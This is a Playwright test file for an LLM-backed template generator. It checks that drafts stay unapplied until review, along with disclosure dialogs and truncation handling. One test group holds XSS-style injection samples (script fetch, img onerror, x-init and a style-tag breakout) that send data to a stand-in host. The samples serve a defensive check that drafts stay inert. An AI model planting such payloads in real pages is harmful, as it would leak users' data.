/**
 * Natural-language generation of category template sections. The generate
 * button on each Custom* / MetaSchema editor (and the whole-template panel)
 * POSTs to /v1/{carrier}/generateTemplate and holds the result as a draft,
 * shown as text, until Apply writes it into the CodeMirror-backed hidden input.
 * The provider is stubbed via page.route so no DeepSeek key is needed.
 */
import type { Locator, Page, Route } from '@playwright/test';
import { test, expect } from '../fixtures/base.fixture';

// The disclosure the server returns for a dry run (decision 11): the generate
// stubs answer it automatically, and only the real request reaches the handler.
const stubDisclosure = {
  groundingHash: 'stub-hash',
  destination: { host: 'api.deepseek.com', profiles: [{ kind: 'pair', model: 'deepseek-v4-flash', thinking: false, maxTokens: 4000, maxCalls: 1 }] },
  continuationRule: { version: 1, text: 'x' },
  sections: [
    { call: 0, role: 'system', key: 'system', label: 'System prompt', bytes: 12, text: 'System text.', constant: true },
    { call: 0, role: 'user', key: 'request', label: 'Your request', bytes: 20, text: 'User request: stub', constant: false },
  ],
};

function withDisclosure(handler: (route: Route) => Promise<void>) {
  return async (route: Route) => {
    if (route.request().postDataJSON()?.dryRun) {
      await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(stubDisclosure) });
      return;
    }
    await handler(route);
  };
}

// Press the preview's Refresh, wait for its render request to answer, then
// outlast the preview's 700ms input debounce, so no refresh is still pending.
async function refreshPreviewAndSettle(page: Page) {
  const rendered = page.waitForResponse((r) => r.url().includes('/previewTemplate'));
  await page.getByRole('button', { name: 'Refresh' }).click();
  await rendered;
  await page.waitForTimeout(900);
}

// Press Tab until target has focus: it is in the tab order within a few stops
// of where focus starts (a trap wraps from its last control to its first).
async function tabUntilFocused(page: Page, target: Locator, maxPresses = 4) {
  for (let i = 0; i < maxPresses; i++) {
    await page.keyboard.press('Tab');
    if (await target.evaluate((el) => el === document.activeElement)) return;
  }
  await expect(target).toBeFocused();
}

// Approve the disclosure dialog that every Generate opens first.
async function sendDisclosure(page: Page) {
  await page.getByTestId('generation-disclosure-send').click();
  await expect(page.getByTestId('generation-disclosure')).toHaveCount(0);
}


test.describe('Template section generation', () => {
  test('a valid slot draft is held for review and applied on Apply', async ({ page }) => {
    let seenBody: Record<string, unknown> | null = null;
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      seenBody = route.request().postDataJSON();
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          target: 'bundle',
          slots: { CustomHeader: '<h1>[property path="Name"]</h1>', CustomHeaderCSS: 'h1{color:red}' },
          explanation: 'Shows the name.',
          valid: true,
        }),
      });
    }));

    await page.goto('/category/new');
    await page.waitForLoadState('load');

    const genButton = page.getByTestId('generate-button-CustomHeader');
    await expect(genButton).toBeVisible({ timeout: 10000 });
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header with the name');
    await genButton.click();
    await sendDisclosure(page);

    await expect(page.getByTestId('generate-review-CustomHeader')).toContainText('<h1>[property path="Name"]</h1>', { timeout: 10000 });
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
    await page.getByTestId('generate-apply-CustomHeader').click();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue(
      '<h1>[property path="Name"]</h1>',
      { timeout: 10000 },
    );
    await expect(page.getByTestId('generate-status-CustomHeader')).toContainText('applied');
    await expect(page.getByTestId('generate-review-CustomHeader')).toHaveCount(0);
    await expect(page.locator('[data-template-cluster="CustomHeader"] input[name="CustomHeaderCSS"]')).toHaveValue('h1{color:red}');

    // The request must carry the target + slot so the server routes correctly.
    expect(seenBody).toMatchObject({ target: 'cluster', slot: 'CustomHeader', prompt: 'a header with the name' });
  });

  test('a prompt submitted before the editors have loaded waits for them', async ({ page }) => {
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          target: 'bundle',
          slots: { CustomHeader: '<h1>[property path="Name"]</h1>', CustomHeaderCSS: 'h1{color:red}' },
          explanation: 'Shows the name.',
          valid: true,
        }),
      });
    }));
    // Hold CodeMirror back, so the prompt is certainly submitted before any editor exists.
    let releaseEditors!: () => void;
    const editorsReleased = new Promise<void>((resolve) => { releaseEditors = resolve; });
    await page.route('**/public/dist/assets/*.js', async (route) => {
      const response = await route.fetch();
      const body = await response.text();
      if (body.includes('cm-editor')) await editorsReleased;
      await route.fulfill({ response, body });
    });

    await page.goto('/category/new');
    await page.waitForLoadState('load');
    await expect(page.locator('.cm-editor')).toHaveCount(0);

    await page.getByTestId('generate-prompt-CustomHeader').fill('a header with the name');
    await page.getByTestId('generate-button-CustomHeader').click();
    await expect(page.getByTestId('generate-status-CustomHeader')).toHaveText('Waiting for the editor to load…');
    await expect(page.getByTestId('generate-button-CustomHeader')).toBeEnabled();
    await expect(page.getByTestId('generate-error-CustomHeader')).toHaveCount(0);

    releaseEditors();
    await sendDisclosure(page);
    await page.getByTestId('generate-apply-CustomHeader').click();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<h1>[property path="Name"]</h1>');
    await expect(page.locator('[data-template-cluster="CustomHeader"] input[name="CustomHeaderCSS"]')).toHaveValue('h1{color:red}');
    await expect(page.getByTestId('generate-status-CustomHeader')).toContainText('applied');
    await page.unrouteAll({ behavior: 'ignoreErrors' });
  });

  test('an invalid slot draft stays out of the editor until Apply', async ({ page }) => {
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          target: 'bundle',
          slots: { CustomHeader: '<div>[meta]</div>', CustomHeaderCSS: '.meta{color:red}' },
          explanation: 'Broken.',
          valid: false,
          issues: [{ severity: 'error', message: '[meta] is missing required attribute "path"' }],
        }),
      });
    }));

    await page.goto('/category/new');
    await page.waitForLoadState('load');

    await expect(page.getByTestId('generate-button-CustomHeader')).toBeVisible({ timeout: 10000 });
    await page.getByTestId('generate-prompt-CustomHeader').fill('a broken meta');
    await page.getByTestId('generate-button-CustomHeader').click();
    await sendDisclosure(page);

    // Error is shown and nothing was applied.
    await expect(page.getByTestId('generate-error-CustomHeader')).toContainText('missing required attribute');
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');

    // Explicit opt-in applies it.
    await page.getByTestId('generate-apply-CustomHeader').click();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<div>[meta]</div>');
    await expect(page.locator('input[name="CustomHeaderCSS"]')).toHaveValue('.meta{color:red}');
  });

  test('a provider error leaves the editor unchanged', async ({ page }) => {
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await route.fulfill({
        status: 503,
        contentType: 'application/json',
        body: JSON.stringify({ error: 'template generation is not configured' }),
      });
    }));

    await page.goto('/category/new');
    await page.waitForLoadState('load');

    await expect(page.getByTestId('generate-button-CustomHeader')).toBeVisible({ timeout: 10000 });
    await page.getByTestId('generate-prompt-CustomHeader').fill('anything');
    await page.getByTestId('generate-button-CustomHeader').click();
    await sendDisclosure(page);

    await expect(page.getByTestId('generate-error-CustomHeader')).toContainText('not configured');
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
  });

  test('the whole-template panel fills multiple slots', async ({ page }) => {
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          target: 'bundle',
          slots: {
            CustomHeader: '<h1>Card</h1>',
            CustomHeaderCSS: '',
            CustomCSS: '.card{padding:1rem}',
          },
          explanation: 'A simple card.',
          valid: true,
        }),
      });
    }));

    await page.goto('/category/new');
    await page.waitForLoadState('load');

    const bundleButton = page.getByTestId('template-bundle-generate-button');
    await expect(bundleButton).toBeVisible({ timeout: 10000 });
    await page.getByTestId('template-bundle-generate-prompt').fill('a compact card');
    await bundleButton.click();
    await sendDisclosure(page);

    // The draft is listed for review; nothing reaches an editor before Apply.
    const review = page.getByTestId('template-bundle-review');
    await expect(review).toBeVisible({ timeout: 10000 });
    await expect(review.getByTestId('template-bundle-review-slot-CustomHeader')).toContainText('<h1>Card</h1>');
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
    await expect(page.locator('input[name="CustomCSS"]')).toHaveValue('');

    await page.getByTestId('template-bundle-apply').click();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<h1>Card</h1>', { timeout: 10000 });
    await expect(page.locator('input[name="CustomCSS"]')).toHaveValue('.card{padding:1rem}');
    await expect(review).toHaveCount(0);
  });
});

// The server's issue for a reply cut off at max_tokens
// (application_context/template_generation.go). An empty reply and JSON that
// stops mid-value both reach the client as this result with nothing to apply;
// the Go tests cover the server telling them apart from a clean stop.
const truncationIssue = {
  severity: 'error',
  message: "The model's reply was cut off at its output limit, so this draft is incomplete. Try a shorter request, or generate fewer slots at once.",
};

test.describe('Truncated and oversize drafts', () => {
  for (const reply of ['empty-length', 'malformed-length']) {
    test(`${reply}: every generate surface shows the truncation issue and applies nothing`, async ({ page }) => {
      await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
        const body = route.request().postDataJSON();
        const target = body.target === 'metaschema' ? 'metaschema' : body.target === 'slot' ? 'slot' : 'bundle';
        await route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({ target, explanation: '', valid: false, issues: [truncationIssue] }),
        });
      }));
      await page.goto('/category/new');
      await page.waitForLoadState('load');

      // CustomCSS, a pair, and the MetaSchema each use the shared controls.
      for (const field of ['CustomCSS', 'CustomHeader', 'MetaSchema']) {
        await expect(page.getByTestId(`generate-button-${field}`)).toBeVisible({ timeout: 10000 });
        await page.getByTestId(`generate-prompt-${field}`).fill('something long');
        await page.getByTestId(`generate-button-${field}`).click();
        await sendDisclosure(page);
        await expect(page.getByTestId(`generate-error-${field}`)).toContainText('cut off at its output limit');
        await expect(page.getByTestId(`generate-error-${field}`)).not.toContainText('must return both');
        await expect(page.getByTestId(`generate-apply-${field}`)).toHaveCount(0);
        await expect(page.locator(`input[name="${field}"]`)).toHaveValue('');
      }
      await expect(page.locator('input[name="CustomHeaderCSS"]')).toHaveValue('');

      // The whole-template panel.
      await page.getByTestId('template-bundle-generate-prompt').fill('something long');
      await page.getByTestId('template-bundle-generate-button').click();
      await sendDisclosure(page);
      await expect(page.getByTestId('template-bundle-tools').getByRole('status')).toContainText('cut off at its output limit');
      await expect(page.getByTestId('template-bundle-review')).toHaveCount(0);
      await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
    });
  }

  test('a parseable truncated bundle draft is listed with its issue and applied only on Apply', async ({ page }) => {
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          target: 'bundle',
          slots: { CustomHeader: '<h1>Cut short</h1>', CustomHeaderCSS: '' },
          explanation: 'Partial.',
          valid: false,
          issues: [truncationIssue],
        }),
      });
    }));
    await page.goto('/category/new');
    await page.waitForLoadState('load');
    await page.getByTestId('template-bundle-generate-prompt').fill('a long template');
    await page.getByTestId('template-bundle-generate-button').click();
    await sendDisclosure(page);

    const review = page.getByTestId('template-bundle-review');
    await expect(review.getByTestId('template-bundle-review-issues')).toContainText('cut off at its output limit');
    await expect(review.getByTestId('template-bundle-review-slot-CustomHeader')).toContainText('<h1>Cut short</h1>');
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');

    await page.getByTestId('template-bundle-apply').click();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<h1>Cut short</h1>');
  });

  test('an over-cap bundle slot is listed with its issue, unsliced, and applied only on Apply', async ({ page }) => {
    const big = `<p>${'x'.repeat(20001)}</p>`;
    const oversize = { severity: 'error', message: `Output exceeded 20000 bytes in CustomHeader (${big.length} bytes). Nothing was cut; shorten it before saving.` };
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({
          target: 'bundle',
          slots: { CustomHeader: big, CustomHeaderCSS: '' },
          explanation: 'Too big.',
          valid: false,
          issues: [oversize],
          slotIssues: { CustomHeader: [oversize] },
        }),
      });
    }));
    await page.goto('/category/new');
    await page.waitForLoadState('load');
    await page.getByTestId('template-bundle-generate-prompt').fill('a huge header');
    await page.getByTestId('template-bundle-generate-button').click();
    await sendDisclosure(page);

    const slot = page.getByTestId('template-bundle-review-slot-CustomHeader');
    await expect(slot).toContainText('Output exceeded 20000 bytes');
    // A slot's issue is listed with the slot, not again as a draft-wide issue.
    await expect(page.getByTestId('template-bundle-review-issues')).toBeHidden();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');

    await page.getByTestId('template-bundle-apply').click();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue(big);
  });
});

for (const carrier of ['category', 'resourceCategory', 'noteType']) {
  test(`${carrier} has one generation prompt per template/CSS pair`, async ({ page }) => {
    await page.route(`**/v1/${carrier}/generateTemplate`, withDisclosure(async (route) => {
      expect(route.request().postDataJSON()).toMatchObject({ target: 'cluster', slot: 'CustomMRQLResult' });
      await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({
        target: 'bundle', valid: true, explanation: 'Styles the card.',
        slots: { CustomMRQLResult: '<p class="result">Card</p>', CustomMRQLResultCSS: '.result{color:red}' },
      }) });
    }));
    await page.goto(`/${carrier}/new`);
    const clusters = page.locator('[data-template-cluster]');
    await expect(clusters.first()).toBeVisible();
    for (const cluster of await clusters.all()) {
      await expect(cluster.locator('textarea[data-testid^="generate-prompt-"]')).toHaveCount(1);
      await expect(cluster.locator('button[data-testid^="generate-button-"]')).toHaveCount(1);
      await expect(cluster.locator('[x-ref="editorContainer"]')).toHaveCount(2);
    }
    const pair = page.locator('[data-template-cluster="CustomMRQLResult"]');
    await pair.getByTestId('generate-prompt-CustomMRQLResult').fill('Style the result card');
    await pair.getByTestId('generate-button-CustomMRQLResult').click();
    await sendDisclosure(page);
    await pair.getByTestId('generate-apply-CustomMRQLResult').click();
    await expect(pair.locator('input[name="CustomMRQLResult"]')).toHaveValue('<p class="result">Card</p>');
    await expect(pair.locator('input[name="CustomMRQLResultCSS"]')).toHaveValue('.result{color:red}');
  });
}

// Decision 10: a generated draft never runs before Apply. The preview runs
// scripts against the full entity, so a draft that reached it unreviewed could
// send that entity out from the author's browser.
test.describe('Generated drafts do not run before Apply', () => {
  const pairDrafts: Record<string, string> = {
    script: '<p class="x">[property path="Name"]</p><script>fetch("https://example.invalid/?s=1")</script>',
    onerror: '<img src=x onerror="fetch(\'https://example.invalid/?e=1\')">',
    'x-init': `<div x-init="location='https://example.invalid/?d='+JSON.stringify(entity)">hi</div>`,
  };

  for (const [name, header] of Object.entries(pairDrafts)) {
    test(`a ${name} draft stays text: no editor, preview or network change before Apply`, async ({ page, apiClient }) => {
      const category = await apiClient.createCategory(`Draft Guard ${name} ${Date.now()}`);
      const groupName = `Draft Guard Target ${Date.now()}`;
      await apiClient.createGroup({ name: groupName, categoryId: category.ID });
      const leaked: string[] = [];
      await page.context().route('**/example.invalid/**', async (route) => {
        leaked.push(route.request().url());
        await route.abort();
      });
      await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
        await route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({ target: 'bundle', valid: true, explanation: 'x', slots: { CustomHeader: header, CustomHeaderCSS: '.x{color:red}' } }),
        });
      }));
      await page.goto(`/category/edit?id=${category.ID}`);
      await expect(page.locator('#tp-entity-group')).toHaveValue(groupName, { timeout: 10000 });
      const frame = page.frameLocator('iframe[title="Template slot preview"]');
      const iframe = page.locator('iframe[title="Template slot preview"]');
      // Let the first render land, so the comparison below is against it.
      await expect.poll(async () => (await iframe.getAttribute('srcdoc')) ?? '', { timeout: 10000 }).toContain('<html');
      await page.waitForTimeout(500);
      const srcdocBefore = await iframe.getAttribute('srcdoc');

      await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
      await page.getByTestId('generate-button-CustomHeader').click();
      await sendDisclosure(page);
      const review = page.getByTestId('generate-review-CustomHeader');
      // The markup is literal text in the panel, and its code is called out.
      await expect(review.getByTestId('generate-review-field-CustomHeader')).toContainText(header);
      await expect(review).toContainText('Runs code once applied');
      await expect(review.locator('script, img[onerror], [x-init]')).toHaveCount(0);

      await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
      await expect(page.locator('input[name="CustomHeaderCSS"]')).toHaveValue('');
      // Refresh re-renders from the hidden inputs, so it catches a draft that
      // leaked into them.
      await refreshPreviewAndSettle(page);
      const srcdocAfter = (await iframe.getAttribute('srcdoc')) ?? '';
      expect(srcdocAfter).not.toContain('example.invalid');
      expect(srcdocAfter).toBe(srcdocBefore ?? '');
      await expect(frame.locator('body')).not.toContainText('hi');
      expect(leaked).toEqual([]);
    });
  }

  test('a CSS draft that closes its style tag stays text before Apply', async ({ page, apiClient }) => {
    const category = await apiClient.createCategory(`Draft Guard CSS ${Date.now()}`);
    const groupName = `Draft Guard CSS Target ${Date.now()}`;
    await apiClient.createGroup({ name: groupName, categoryId: category.ID });
    const leaked: string[] = [];
    await page.context().route('**/example.invalid/**', async (route) => {
      leaked.push(route.request().url());
      await route.abort();
    });
    const css = `.a{color:red}</style><div x-init="location='https://example.invalid/?c=1'">x</div>`;
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ target: 'slot', valid: true, explanation: 'x', content: css }) });
    }));
    await page.goto(`/category/edit?id=${category.ID}`);
    // An active preview: the entity is loaded and a render has completed.
    await expect(page.locator('#tp-entity-group')).toHaveValue(groupName, { timeout: 10000 });
    const iframe = page.locator('iframe[title="Template slot preview"]');
    await refreshPreviewAndSettle(page);
    const srcdocBefore = (await iframe.getAttribute('srcdoc')) ?? '';
    expect(srcdocBefore).toContain('<html');

    await page.getByTestId('generate-prompt-CustomCSS').fill('styles');
    await page.getByTestId('generate-button-CustomCSS').click();
    await sendDisclosure(page);
    const review = page.getByTestId('generate-review-CustomCSS');
    await expect(review).toContainText(css);
    await expect(review).toContainText('</style> breakout');
    await expect(review.locator('[x-init]')).toHaveCount(0);
    await expect(page.locator('input[name="CustomCSS"]')).toHaveValue('');

    await refreshPreviewAndSettle(page);
    const srcdocAfter = (await iframe.getAttribute('srcdoc')) ?? '';
    expect(srcdocAfter).not.toContain('example.invalid');
    expect(srcdocAfter).toBe(srcdocBefore);
    expect(leaked).toEqual([]);
  });

  for (const [kind, extra] of Object.entries({
    valid: { valid: true },
    invalid: { valid: false, issues: [{ severity: 'error', message: '[meta] is missing required attribute "path"' }] },
    'auto-repaired': { valid: true, repair: { attempted: true, applied: true, reason: '' } },
  })) {
    test(`Apply is offered and works for a ${kind} draft`, async ({ page }) => {
      await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
        await route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({ target: 'bundle', explanation: 'x', slots: { CustomHeader: `<h1>${kind}</h1>`, CustomHeaderCSS: '' }, ...extra }),
        });
      }));
      await page.goto('/category/new');
      await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
      await page.getByTestId('generate-button-CustomHeader').click();
      await sendDisclosure(page);
      await expect(page.getByTestId('generate-apply-CustomHeader')).toBeVisible();
      await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
      await page.getByTestId('generate-apply-CustomHeader').click();
      await expect(page.locator('input[name="CustomHeader"]')).toHaveValue(`<h1>${kind}</h1>`);
    });
  }

  test('a truncated incomplete pair shows the truncation issue, not the pair-shape error', async ({ page }) => {
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({ target: 'bundle', valid: false, explanation: '', slots: { CustomHeader: '<h1>half' }, issues: [truncationIssue] }),
      });
    }));
    await page.goto('/category/new');
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
    await page.getByTestId('generate-button-CustomHeader').click();
    await sendDisclosure(page);
    await expect(page.getByTestId('generate-error-CustomHeader')).toContainText('cut off at its output limit');
    await expect(page.getByTestId('generate-error-CustomHeader')).not.toContainText('must return both');
    // The half that arrived is reviewable, and Apply is not offered for it.
    await expect(page.getByTestId('generate-review-text-CustomHeader')).toHaveText('<h1>half');
    await expect(page.getByTestId('generate-review-CustomHeader')).toContainText('cannot be applied');
    await expect(page.getByTestId('generate-apply-CustomHeader')).toBeHidden();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
  });

  test('Apply after an edit during generation asks first and keeps the edit on cancel', async ({ page }) => {
    let release!: () => void;
    const released = new Promise<void>((resolve) => { release = resolve; });
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await released;
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({ target: 'bundle', valid: true, explanation: 'x', slots: { CustomHeader: '<h1>Draft</h1>', CustomHeaderCSS: '.draft{}' } }),
      });
    }));
    await page.goto('/category/new');
    const cssEditor = page.locator('.cm-content[aria-label="Custom Header CSS"]');
    await expect(cssEditor).toBeVisible({ timeout: 10000 });
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
    await page.getByTestId('generate-button-CustomHeader').click();
    await sendDisclosure(page);
    await cssEditor.click();
    await page.keyboard.type('.mine{}');
    release();

    await page.getByTestId('generate-apply-CustomHeader').click();
    const dialog = page.getByRole('alertdialog', { name: 'Replace your edits?' });
    await expect(dialog).toContainText('CustomHeaderCSS');
    await dialog.getByRole('button', { name: 'Keep my edits' }).click();
    await expect(page.locator('input[name="CustomHeaderCSS"]')).toHaveValue('.mine{}');
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('');
    await expect(page.getByTestId('generate-apply-CustomHeader')).toBeFocused();

    await page.getByTestId('generate-apply-CustomHeader').click();
    await page.getByRole('alertdialog', { name: 'Replace your edits?' }).getByRole('button', { name: 'Replace' }).click();
    await expect(page.locator('input[name="CustomHeaderCSS"]')).toHaveValue('.draft{}');
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<h1>Draft</h1>');
    // Apply went with the panel; focus lands on Generate, not <body>.
    await expect(page.getByTestId('generate-button-CustomHeader')).toBeFocused();
  });

  test('a bundle Apply after an edit during generation asks first and keeps the edit on cancel', async ({ page }) => {
    let release!: () => void;
    const released = new Promise<void>((resolve) => { release = resolve; });
    await page.route('**/v1/category/generateTemplate', withDisclosure(async (route) => {
      await released;
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({ target: 'bundle', valid: true, explanation: 'x', slots: { CustomHeader: '<h1>Draft</h1>', CustomHeaderCSS: '', CustomCSS: '.draft{}' } }),
      });
    }));
    await page.goto('/category/new');
    const header = page.locator('.cm-content[aria-label="Custom Header"]');
    await expect(header).toBeVisible({ timeout: 10000 });
    await page.getByTestId('template-bundle-generate-prompt').fill('a template');
    await page.getByTestId('template-bundle-generate-button').click();
    await sendDisclosure(page);
    await header.click();
    await page.keyboard.type('<p>mine</p>');
    release();

    await page.getByTestId('template-bundle-apply').click();
    const dialog = page.getByRole('alertdialog', { name: 'Replace your edits?' });
    await expect(dialog).toContainText('CustomHeader');
    await expect(dialog).not.toContainText('CustomCSS');
    await dialog.getByRole('button', { name: 'Keep my edits' }).click();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<p>mine</p>');
    await expect(page.locator('input[name="CustomCSS"]')).toHaveValue('');
    await expect(page.getByTestId('template-bundle-review')).toBeVisible();
    await expect(page.getByTestId('template-bundle-apply')).toBeFocused();

    await page.getByTestId('template-bundle-apply').click();
    await page.getByRole('alertdialog', { name: 'Replace your edits?' }).getByRole('button', { name: 'Replace' }).click();
    await expect(page.locator('input[name="CustomHeader"]')).toHaveValue('<h1>Draft</h1>');
    await expect(page.getByTestId('template-bundle-generate-button')).toBeFocused();
  });
});

// Decision 11: every Generate first shows exactly what would be sent, from a
// dry run, and sends it only on approval. The server side (the disclosure equals
// the provider request, the hash, 409/400) is covered by the Go tests; these
// stubs return a disclosure so the dialog and its focus rules can be driven.
test.describe('Generation disclosure dialog', () => {
  // Counts the real (non-dry-run) generate requests; `gate` holds them.
  async function spyGenerate(page: Page, reply: () => { status: number; body: unknown }, gate?: Promise<void>, sections = stubDisclosure.sections) {
    const sent: Record<string, unknown>[] = [];
    await page.route('**/v1/category/generateTemplate', async (route) => {
      const body = route.request().postDataJSON();
      if (body?.dryRun) {
        await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ...stubDisclosure, sections }) });
        return;
      }
      sent.push(body);
      if (gate) await gate;
      const { status, body: payload } = reply();
      await route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(payload) });
    });
    return sent;
  }
  const okDraft = () => ({ status: 200, body: { target: 'bundle', valid: true, explanation: 'x', slots: { CustomHeader: '<h1>x</h1>', CustomHeaderCSS: '' } } });
  const sampleSections = [
    { call: 0, role: 'system', key: 'system', label: 'System prompt', bytes: 12, text: 'System text.', constant: true },
    { call: 0, role: 'user', key: 'samples', label: 'Sample values', bytes: 40, text: '<<<BEGIN samples>>>\n{"Name":"Seeded Recipe Group"}\n<<<END samples>>>', constant: false },
    { call: 0, role: 'user', key: 'request', label: 'Your request', bytes: 20, text: 'User request: a header', constant: false },
  ];

  test('Generate opens the disclosure, and Send makes exactly one request carrying the hash', async ({ page }) => {
    const sent = await spyGenerate(page, okDraft, undefined, sampleSections);
    await page.goto('/category/new');
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
    await page.getByTestId('generate-button-CustomHeader').click();

    const dialog = page.getByRole('dialog', { name: 'Review what will be sent' });
    await expect(dialog).toBeVisible();
    // User data is expanded; constant reference text is collapsed.
    const isOpen = (key: string) => dialog.locator(`details[data-section="${key}"]`).evaluate((el) => (el as HTMLDetailsElement).open);
    await expect.poll(() => isOpen('samples')).toBe(true);
    await expect(dialog.locator('details[data-section="samples"] pre')).toHaveText(/Seeded Recipe Group/);
    await expect.poll(() => isOpen('system')).toBe(false);
    expect(sent).toHaveLength(0);

    await dialog.getByRole('button', { name: 'Send to api.deepseek.com' }).click();
    await expect(page.getByTestId('generate-review-CustomHeader')).toBeVisible();
    expect(sent).toHaveLength(1);
    expect(sent[0].groundingHash).toBe('stub-hash');
  });

  test('Cancel and Escape send nothing and return focus to Generate', async ({ page }) => {
    const sent = await spyGenerate(page, okDraft);
    await page.goto('/category/new');
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
    const generate = page.getByTestId('generate-button-CustomHeader');

    await generate.click();
    await page.getByTestId('generation-disclosure-cancel').click();
    await expect(page.getByTestId('generation-disclosure')).toHaveCount(0);
    await expect(generate).toBeFocused();

    await generate.click();
    await expect(page.getByTestId('generation-disclosure')).toBeVisible();
    await page.keyboard.press('Escape');
    await expect(page.getByTestId('generation-disclosure')).toHaveCount(0);
    await expect(generate).toBeFocused();
    await page.waitForTimeout(200);
    expect(sent).toHaveLength(0);
  });

  test('a long disclosure at 375px keeps its actions reachable and scrolls by keyboard', async ({ page }) => {
    await page.setViewportSize({ width: 375, height: 667 });
    const long = { call: 0, role: 'user', key: 'samples', label: 'Sample values', bytes: 10240, text: Array.from({ length: 400 }, (_, i) => `line ${i} of a long sample`).join('\n'), constant: false };
    await spyGenerate(page, okDraft, undefined, [...stubDisclosure.sections, long]);
    await page.goto('/category/new');
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
    await page.getByTestId('generate-button-CustomHeader').click();

    const send = page.getByTestId('generation-disclosure-send');
    await expect(send).toBeInViewport();
    await expect(page.getByTestId('generation-disclosure-cancel')).toBeInViewport();
    const list = page.getByTestId('generation-disclosure-sections');
    // The trap starts on Cancel; past Send it wraps to the list, the first stop.
    await expect(page.getByTestId('generation-disclosure-cancel')).toBeFocused();
    await tabUntilFocused(page, list);
    const before = await list.evaluate((el) => el.scrollTop);
    await page.keyboard.press('PageDown');
    await page.keyboard.press('PageDown');
    await expect.poll(() => list.evaluate((el) => el.scrollTop)).toBeGreaterThan(before);
    await expect(send).toBeInViewport();
  });

  test('after Send focus waits on the status region, then returns to Generate', async ({ page }) => {
    let release!: () => void;
    const gate = new Promise<void>((resolve) => { release = resolve; });
    await spyGenerate(page, okDraft, gate);
    await page.goto('/category/new');
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
    await page.getByTestId('generate-button-CustomHeader').click();
    await sendDisclosure(page);

    const status = page.getByTestId('generate-status-CustomHeader');
    await expect(status).toBeFocused();
    await expect(page.getByTestId('generate-button-CustomHeader')).toBeDisabled();
    release();
    await expect(page.getByTestId('generate-button-CustomHeader')).toBeFocused();
  });

  for (const [name, failure] of Object.entries({
    'an HTTP error': (route: Route) => route.fulfill({ status: 502, contentType: 'application/json', body: JSON.stringify({ error: 'template generation provider error' }) }),
    'a network rejection': (route: Route) => route.abort(),
  })) {
    test(`after ${name} focus is on Generate, not body`, async ({ page }) => {
      await page.route('**/v1/category/generateTemplate', async (route) => {
        if (route.request().postDataJSON()?.dryRun) {
          await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(stubDisclosure) });
          return;
        }
        await failure(route);
      });
      await page.goto('/category/new');
      await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
      await page.getByTestId('generate-button-CustomHeader').click();
      await sendDisclosure(page);
      await expect(page.getByTestId('generate-error-CustomHeader')).toBeVisible();
      await expect(page.getByTestId('generate-button-CustomHeader')).toBeFocused();
    });
  }

  test('a 409 shows Review again and opens nothing by itself', async ({ page }) => {
    await spyGenerate(page, () => ({ status: 409, body: { error: 'the data to be sent changed; review it again' } }));
    await page.goto('/category/new');
    await page.getByTestId('generate-prompt-CustomHeader').fill('a header');
    await page.getByTestId('generate-button-CustomHeader').click();
    await sendDisclosure(page);
